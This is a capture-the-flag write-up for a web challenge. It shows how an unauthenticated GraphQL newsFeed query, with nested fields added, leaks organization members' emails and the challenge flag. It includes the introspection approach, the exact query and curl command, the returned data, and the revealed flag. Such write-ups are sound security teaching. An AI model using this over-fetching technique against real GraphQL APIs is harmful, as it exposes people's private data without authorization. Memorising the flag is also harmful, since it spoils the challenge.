# rEquestria – Lesson Zero

Author - Senpai

rEquestria – Lesson Zero | CTF Writeup

Category: Web

Points: 490

Summary

A GraphQL API with no authentication on the newsFeed query exposes nested organizational data through over-fetching, leaking the flag in a member's email field.

Reconnaissance
The target was a React SPA at https://mail.equestriasociety.com. With JavaScript required to render the page, the first step was pulling the JS bundle from the page source (/static/js/main.36c9c96c.js) and analyzing it.
Grepping through the minified bundle revealed the GraphQL endpoint (/graphql), all compiled query/mutation definitions, a role-based access system (minRole: 0/2), and a source code download endpoint (/download/source). Importantly, REACT_APP_CLAUDE_ENABLED: "true" hinted at AI integration, and the newsFeed query was called on the login page — meaning it required no authentication.

Enumeration
Firing a GraphQL introspection query confirmed the full schema was publicly accessible. This revealed all types, queries, and mutations — including a User type with a subOrganization field containing a members list, which wasn't present in the frontend JS queries.

Running the newsFeed query with the additional nested fields:
query {
  newsFeed {
    title
    author {
      name
      subOrganization {
        name
        members {
          name
          email
          role
        }
      }
    }
  }
}
```
"curl -s -X POST https://mail.equestriasociety.com/graphql \
-H "Content-Type: application/json" \
--data '{"query": "{ newsFeed { author { subOrganization { name members { name email } } } } }"}' | python3 -m json.tool
{
    "data": {
        "newsFeed": [
            {
                "author": {
                    "subOrganization": {
                        "members": [
                            {
                                "email": "luna.starlight@equestriasociety.com",
                                "name": "Luna Starlight"
                            },
                            {
                                "email": "luna.belle@equestriasociety.com",
                                "name": "Luna Belle"
                            }
                        ],
                        "name": "moon_council"
                    }
                }
            },
            {
                "author": {
                    "subOrganization": {
                        "members": [
                            {
                                "email": "luna.starlight@equestriasociety.com",
                                "name": "Luna Starlight"
                            },
                            {
                                "email": "luna.belle@equestriasociety.com",
                                "name": "Luna Belle"
                            }
                        ],
                        "name": "moon_council"
                    }
                }
            },
            {
                "author": {
                    "subOrganization": {
                        "members": [
                            {
                                "email": "rose.garden@equestriasociety.com",
                                "name": "Rose Garden"
                            },
                            {
                                "email": "friends@equestriasociety.com",
                                "name": "EFS External Contact"
                            }
                        ],
                        "name": "public_relations"
                    }
                }
            },
            {
                "author": {
                    "subOrganization": {
                        "members": [
                            {
                                "email": "starswirl.helper@equestriasociety.com",
                                "name": "Starswirl Helper"
                            },
                            {
                                "email": "moon.dancer@equestriasociety.com",
                                "name": "Moon Dancer"
                            },
                            {
                                "email": "twilight.scholar@equestriasociety.com",
                                "name": "Twilight Scholar"
                            },
                            {
                                "email": "fluttershy.quiet@equestriasociety.com",
                                "name": "Fluttershy Quiet"
                            },
                            {
                                "email": "SK-CERT{l34ky_l34ks_4ll_0v3r_3questria}@lol.com",
                                "name": "Flaggie Flag"
                            }
                        ],
                        "name": "volunteer_outreach"
                    }
                }
            }
        ]
    }
}
"
## Flag

The response included a `volunteer_outreach` sub-organization whose member list contained a fake user — "Flaggie Flag" — with the flag as their email address:
```
SK-CERT{l34ky_l34ks_4ll_0v3r_3questria}

Vulnerability
GraphQL over-fetching / broken object-level authorization. The newsFeed resolver was intentionally public, but the nested subOrganization.members resolver inherited that access without its own authorization check. This allowed an unauthenticated attacker to traverse the object graph and retrieve data that should have required authentication — a textbook case of excessive data exposure in GraphQL APIs.
